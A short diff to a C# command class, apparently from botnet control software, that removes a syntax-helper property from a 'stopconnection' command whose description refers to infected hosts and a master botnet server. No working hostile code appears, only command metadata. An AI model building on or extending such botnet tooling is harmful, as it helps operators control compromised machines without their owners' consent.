@@ -10,8 +10,6 @@ namespace Client.Commands
 
         public string description { get; } = "Stop the infected host from trying to connect to you.\nIt will still connect back to the master botnet server to get new commands.";
 
-        public string syntaxHelper { get; } = "stopconnection";
-
         public bool isLocal { get; } = false;
 
         public List<string> validArguments { get; } = null;
